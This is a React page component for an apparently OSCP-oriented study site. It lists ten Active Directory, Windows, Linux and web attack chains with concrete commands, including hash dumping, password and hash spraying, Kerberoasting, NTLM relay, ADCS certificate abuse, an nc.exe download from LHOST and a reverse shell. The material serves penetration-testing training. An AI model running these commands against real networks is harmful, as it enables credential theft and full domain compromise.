"use client";

import { ArrowRight, ChevronDown, ChevronUp } from "lucide-react";
import { useState } from "react";

type Step = { label: string; detail: string; color: string };
type Chain = {
  id: string;
  title: string;
  scenario: string;
  tags: string[];
  steps: Step[];
  tip?: string;
};

const CHAINS: Chain[] = [
  {
    id: "A",
    title: "Classic Foothold → PrivEsc → Pivot",
    scenario: "Entry through a public-facing service, escalate, then pivot into the internal network.",
    tags: ["linux", "all"],
    steps: [
      { label: "Recon", detail: "nmap full-port + service versions. Enumerate all open services.", color: "text-core" },
      { label: "Foothold", detail: "Exploit vulnerable service (RCE, file upload, SQLi). Get low-priv shell.", color: "text-post" },
      { label: "Local enum", detail: "linPEAS / winPEAS. Look for SUID, sudo -l, writable crons, weak services.", color: "text-warn" },
      { label: "PrivEsc", detail: "Exploit finding → root/SYSTEM shell.", color: "text-success" },
      { label: "Loot", detail: "Dump creds from /etc/shadow, SAM, history files, config files.", color: "text-orange" },
      { label: "Pivot", detail: "Find internal IPs via ip addr/ipconfig. Set up Ligolo-ng or SSH tunnel.", color: "text-adblue" },
    ],
    tip: "Always collect proof screenshots at each privilege level — you cannot go back.",
  },
  {
    id: "B",
    title: "Web App → RCE → Linux PrivEsc",
    scenario: "Web application is the attack surface — find injection, get RCE, then escalate on Linux.",
    tags: ["web", "linux"],
    steps: [
      { label: "Web enum", detail: "ffuf/gobuster dirs + vhosts. Nikto scan. Check source and JS files.", color: "text-core" },
      { label: "Injection", detail: "SQLi, SSTI, SSRF, command injection, or deserialization in app inputs.", color: "text-post" },
      { label: "Shell", detail: "Upgrade to full reverse shell. python3 pty + stty for TTY upgrade.", color: "text-warn" },
      { label: "LinEnum", detail: "linPEAS + manual: sudo -l, cron, SUID, writable paths, capabilities.", color: "text-violet" },
      { label: "PrivEsc", detail: "GTFOBin / custom exploit → root. cat /root/proof.txt.", color: "text-success" },
    ],
    tip: "SSTI in Jinja2/Twig → immediate RCE. Test every input with {{7*7}} first.",
  },
  {
    id: "C",
    title: "Password Spray → Local Admin → SAM → Reuse",
    scenario: "Valid domain user found; spray credentials across the environment to find local admin access.",
    tags: ["windows", "ad"],
    steps: [
      { label: "Get userlist", detail: "kerbrute userenum / ldap query / RPC enumusers for valid domain users.", color: "text-core" },
      { label: "Spray", detail: "nxc smb 10.10.10.0/24 -u users.txt -p 'Password1' — look for Pwn3d!", color: "text-post" },
      { label: "Local admin", detail: "RDP or evil-winrm / psexec onto Pwn3d! host.", color: "text-warn" },
      { label: "SAM dump", detail: "nxc smb {host} -u user -p pass --sam  OR  reg save + secretsdump.", color: "text-orange" },
      { label: "Reuse hashes", detail: "nxc smb subnet -u administrator -H {HASH} — spray hash across network.", color: "text-success" },
      { label: "Domain escalate", detail: "If admin hash works on DC → secretsdump NTDS → full domain compromise.", color: "text-adblue" },
    ],
    tip: "Spraying '(Season)(Year)!' passwords catches many OSCP boxes. Try Password1, Summer2024!, etc.",
  },
  {
    id: "D",
    title: "AS-REP → Crack → Kerberoast → PtH → DCSync",
    scenario: "Pure Kerberos attack chain from zero creds to full domain compromise.",
    tags: ["ad"],
    steps: [
      { label: "AS-REP Roast", detail: "GetNPUsers.py domain/ -dc-ip DC -usersfile users.txt — get hashes without creds.", color: "text-core" },
      { label: "Crack", detail: "hashcat -m 18200 asrep.txt rockyou.txt → get plaintext password.", color: "text-post" },
      { label: "Kerberoast", detail: "GetUserSPNs.py domain/cracked_user:pass -dc-ip DC -request → TGS hashes.", color: "text-warn" },
      { label: "Crack TGS", detail: "hashcat -m 13100 tgs.hashes rockyou.txt → service account password.", color: "text-orange" },
      { label: "PtH / access", detail: "evil-winrm -i DC -u svc_admin -p pass  OR  psexec with hash.", color: "text-success" },
      { label: "DCSync", detail: "secretsdump.py domain/svc_admin:pass@DC → all NTLM hashes.", color: "text-adblue" },
    ],
    tip: "Even a low-priv domain user can Kerberoast. AS-REP roasting needs no creds at all.",
  },
  {
    id: "E",
    title: "BloodHound → ACL Abuse → Shadow Admin",
    scenario: "Use BloodHound to find ACL attack paths — GenericWrite/WriteDACL to create a shadow admin.",
    tags: ["ad"],
    steps: [
      { label: "Collect", detail: "bloodhound-python -d domain -u user -p pass -ns DC -c all", color: "text-core" },
      { label: "Ingest + analyze", detail: "Import ZIP into BloodHound. Run 'Shortest Paths to DA'.", color: "text-post" },
      { label: "Find ACL edge", detail: "Look for GenericWrite, GenericAll, WriteDACL, WriteOwner on DA path.", color: "text-warn" },
      { label: "Abuse GenericWrite", detail: "Set SPN → Kerberoast target. OR add shadow credential (pywhisker).", color: "text-orange" },
      { label: "Abuse WriteDACL", detail: "dacledit.py: grant your user DCSync rights, then secretsdump.", color: "text-success" },
      { label: "DCSync", detail: "secretsdump.py domain/your_user:pass@DC → all hashes.", color: "text-adblue" },
    ],
    tip: "WriteDACL → DCSync is the most direct path. GenericAll is even better — covers everything.",
  },
  {
    id: "F",
    title: "ADCS ESC1 → Certificate → DA",
    scenario: "Certificate template misconfiguration (ESC1) allows requesting a DA certificate.",
    tags: ["ad"],
    steps: [
      { label: "Find ADCS", detail: "certipy find -u user@domain -p pass -dc-ip DC -vulnerable", color: "text-core" },
      { label: "Identify ESC1", detail: "Flag: ENROLLEE_SUPPLIES_SUBJECT + low-priv enrollment. Note CA and template name.", color: "text-post" },
      { label: "Request cert", detail: "certipy req -u user@domain -p pass -ca CA_NAME -template TEMPLATE -upn administrator@domain", color: "text-warn" },
      { label: "Authenticate", detail: "certipy auth -pfx administrator.pfx -dc-ip DC → returns NTLM hash.", color: "text-orange" },
      { label: "PtH → DA", detail: "impacket-psexec -hashes :NTLM domain/administrator@DC", color: "text-success" },
    ],
    tip: "ESC1 is the most common ADCS misconfiguration on OSCP labs. Always run certipy find.",
  },
  {
    id: "G",
    title: "NTLM Relay → RBCD → Impersonate DA",
    scenario: "SMB signing disabled — relay captured auth to LDAP, grant RBCD, then impersonate any user.",
    tags: ["ad"],
    steps: [
      { label: "Find unsigned", detail: "nmap --script smb2-security-mode -p 445 10.10.10.0/24 | grep 'not required'", color: "text-core" },
      { label: "Setup relay", detail: "ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user lowpriv_user", color: "text-post" },
      { label: "Trigger auth", detail: "Responder -I eth0 (disable SMB/HTTP). Wait for captured auth or use PetitPotam.", color: "text-warn" },
      { label: "Check RBCD", detail: "After relay succeeds, target machine account has msDS-AllowedToActOnBehalfOfOtherIdentity set.", color: "text-orange" },
      { label: "S4U2Self", detail: "getST.py -spn cifs/TARGET -impersonate administrator domain/lowpriv_user:pass -dc-ip DC", color: "text-success" },
      { label: "Use ticket", detail: "export KRB5CCNAME=administrator.ccache && smbclient -k //TARGET/C$", color: "text-adblue" },
    ],
    tip: "Disable SMB and HTTP in Responder.conf before running — ntlmrelayx handles those protocols.",
  },
  {
    id: "H",
    title: "MSSQL → xp_cmdshell → Local Admin → PtH",
    scenario: "MSSQL exposed with weak credentials — enable xp_cmdshell for RCE, loot, then lateral move.",
    tags: ["windows", "ad"],
    steps: [
      { label: "Connect", detail: "impacket-mssqlclient domain/user:pass@RHOST -windows-auth", color: "text-core" },
      { label: "Enable xp_cmdshell", detail: "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;", color: "text-post" },
      { label: "RCE", detail: "EXEC xp_cmdshell 'whoami' — verify execution context. Often runs as service account.", color: "text-warn" },
      { label: "Upload shell", detail: "xp_cmdshell 'certutil -urlcache -f http://LHOST/nc.exe C:\\Windows\\Temp\\nc.exe'", color: "text-orange" },
      { label: "Rev shell", detail: "xp_cmdshell 'C:\\Windows\\Temp\\nc.exe LHOST LPORT -e cmd.exe'", color: "text-success" },
      { label: "Loot → PtH", detail: "reg save SAM/SYSTEM, transfer + secretsdump. Spray hashes across network.", color: "text-adblue" },
    ],
    tip: "Check linked servers: SELECT * FROM sys.servers — pivot deeper into the network via SQL.",
  },
  {
    id: "I",
    title: "Unconstrained Delegation → PrinterBug → TGT → DCSync",
    scenario: "Machine with unconstrained delegation + PrinterBug coercion → capture DC's TGT → domain admin.",
    tags: ["ad"],
    steps: [
      { label: "Find unconstrained", detail: "findDelegation.py domain/user:pass -dc-ip DC | grep 'Unconstrained'", color: "text-core" },
      { label: "Get shell on target", detail: "Compromise the host with unconstrained delegation (often a print server or old server).", color: "text-post" },
      { label: "Monitor TGTs", detail: "Rubeus.exe monitor /interval:5 /filteruser:DC$ — watch for incoming tickets.", color: "text-warn" },
      { label: "Coerce DC auth", detail: "SpoolSample.exe DC COMPROMISED_HOST  OR  PetitPotam.py COMPROMISED_HOST DC", color: "text-orange" },
      { label: "Capture DC TGT", detail: "Rubeus intercepts the DC machine account's TGT. Export from memory.", color: "text-success" },
      { label: "DCSync", detail: "Rubeus.exe ptt /ticket:BASE64 → mimikatz lsadump::dcsync /domain:domain /all", color: "text-adblue" },
    ],
    tip: "PrinterBug works even after MS-RPRN patch if WebDAV is running. Try PetitPotam as fallback.",
  },
  {
    id: "J",
    title: "Shadow Credentials → PKINIT → NTHash → PtH",
    scenario: "GenericWrite on a user/computer — add KeyCredential, use PKINIT to extract NTLM hash.",
    tags: ["ad"],
    steps: [
      { label: "Find GenericWrite", detail: "BloodHound: search for GenericWrite / WriteProperty edges on msDS-KeyCredentialLink.", color: "text-core" },
      { label: "Add shadow cred", detail: "pywhisker.py -d domain -u attacker -p pass --target victim --action add", color: "text-post" },
      { label: "Get TGT (PKINIT)", detail: "gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass PASS domain/victim victim.ccache", color: "text-warn" },
      { label: "Extract NT hash", detail: "getnthash.py -key AS_REP_KEY domain/victim", color: "text-orange" },
      { label: "PtH", detail: "evil-winrm -i victim_host -u victim -H NTHASH  OR  psexec -hashes :NTHASH", color: "text-success" },
    ],
    tip: "Works on both user and computer objects. Useful when the target has LAPS and you need the local admin hash.",
  },
];

const tagColors: Record<string, string> = {
  linux: "bg-success/15 text-success border-success/40",
  windows: "bg-core/15 text-core border-core/40",
  ad: "bg-adblue/15 text-adblue border-adblue/40",
  web: "bg-post/15 text-post border-post/40",
  all: "bg-dim/10 text-dim border-border",
};

function ChainCard({ chain }: { chain: Chain }) {
  const [open, setOpen] = useState(false);

  return (
    <article className="rounded border border-border bg-surface overflow-hidden transition-colors hover:border-orange/30">
      <button
        className="w-full p-4 text-left"
        onClick={() => setOpen((v) => !v)}
      >
        <div className="flex items-start justify-between gap-3">
          <div className="flex items-start gap-3 min-w-0">
            <span className="shrink-0 font-mono text-lg font-bold text-orange/60">{chain.id}</span>
            <div className="min-w-0">
              <p className="font-mono text-sm text-bright">{chain.title}</p>
              <p className="mt-0.5 text-xs text-dim line-clamp-2">{chain.scenario}</p>
            </div>
          </div>
          <div className="flex shrink-0 items-center gap-2">
            <div className="flex flex-wrap gap-1">
              {chain.tags.map((t) => (
                <span key={t} className={`rounded border px-1.5 py-0.5 font-mono text-[10px] uppercase ${tagColors[t] ?? "bg-dim/10 text-dim border-border"}`}>{t}</span>
              ))}
            </div>
            {open ? <ChevronUp size={14} className="text-dim" /> : <ChevronDown size={14} className="text-dim" />}
          </div>
        </div>
      </button>

      {open && (
        <div className="border-t border-border px-4 pb-4 pt-3">
          {/* Step flow */}
          <div className="mb-4 flex flex-wrap items-center gap-1.5">
            {chain.steps.map((step, i) => (
              <div key={step.label} className="flex items-center gap-1.5">
                <span className={`font-mono text-xs font-semibold ${step.color}`}>{step.label}</span>
                {i < chain.steps.length - 1 && <ArrowRight size={11} className="text-dim/40" />}
              </div>
            ))}
          </div>

          {/* Step details */}
          <div className="space-y-2">
            {chain.steps.map((step, i) => (
              <div key={step.label} className="flex gap-3 rounded border border-border bg-surface2 px-3 py-2">
                <span className={`shrink-0 font-mono text-[10px] font-bold uppercase w-20 mt-0.5 ${step.color}`}>{String(i + 1).padStart(2, "0")} {step.label}</span>
                <code className="font-mono text-xs text-dim break-all">{step.detail}</code>
              </div>
            ))}
          </div>

          {chain.tip && (
            <p className="mt-3 rounded border border-orange/20 bg-orange/5 px-3 py-2 font-mono text-xs text-dim/80">
              <span className="text-orange/70">tip: </span>{chain.tip}
            </p>
          )}
        </div>
      )}
    </article>
  );
}

export default function ChainsPage() {
  const [filter, setFilter] = useState<string>("all");
  const tags = ["all", "linux", "windows", "ad", "web"];

  const visible = filter === "all"
    ? CHAINS
    : CHAINS.filter((c) => c.tags.includes(filter));

  return (
    <div className="space-y-5">
      <header>
        <h1 className="font-heading text-3xl text-bright">Attack Chains</h1>
        <p className="mt-1 text-sm text-dim">10 end-to-end attack patterns — click any chain to expand steps.</p>
      </header>

      <div className="flex flex-wrap gap-2">
        {tags.map((t) => (
          <button
            key={t}
            onClick={() => setFilter(t)}
            className={`rounded border px-3 py-1 font-mono text-xs uppercase transition-colors ${filter === t ? "border-orange/60 bg-orange/10 text-orange" : "border-border bg-surface2 text-dim hover:text-bright"}`}
          >
            {t}
          </button>
        ))}
        <span className="ml-auto font-mono text-[10px] text-dim self-center">{visible.length} chains</span>
      </div>

      <div className="space-y-3">
        {visible.map((chain) => (
          <ChainCard key={chain.id} chain={chain} />
        ))}
      </div>
    </div>
  );
}
